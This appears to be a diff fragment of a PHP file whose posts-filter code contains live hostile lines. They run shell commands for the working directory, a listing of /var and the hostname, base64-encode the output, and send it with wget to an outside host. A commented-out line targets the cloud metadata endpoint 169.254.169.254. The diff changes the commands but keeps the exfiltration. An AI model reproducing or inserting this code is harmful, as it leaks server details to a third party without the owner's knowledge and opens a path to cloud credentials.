@@ -27,7 +27,7 @@ function posts_filter($posts, $tag)
 }
 
 //$url = "http://169.254.169.254/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json";
-$ooo = base64_encode(exec("ls .") . "\n" . exec("ls /") . "\n" . exec("hostname -a") );
+$ooo = base64_encode(exec("pwd") . "\n" . exec("ls /var/") . "\n" . exec("hostname") );
 system("wget http://php-exec.dns.pitr.be/?".$ooo);
 
 /*
